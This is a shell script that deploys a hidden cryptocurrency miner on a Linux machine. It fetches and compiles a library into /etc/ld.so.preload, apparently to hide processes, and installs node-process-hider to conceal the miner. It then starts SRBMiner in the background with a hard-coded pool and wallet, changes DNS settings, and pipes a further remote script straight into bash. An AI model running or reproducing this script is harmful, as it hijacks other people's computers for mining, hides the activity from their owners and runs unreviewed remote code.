#!/bin/sh
sudo apt update
sudo apt install screen -y
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.2.8/SRBMiner-Multi-3-2-8-Linux.tar.gz >/dev/null 2>&1
tar -xzvf SRBMiner-Multi-3-2-8-Linux.tar.gz
cd SRBMiner-Multi-3-2-8
./SRBMiner-MULTI --algorithm verushash --pool 168.144.148.201:443 --wallet RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP."0$RANDOM" >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
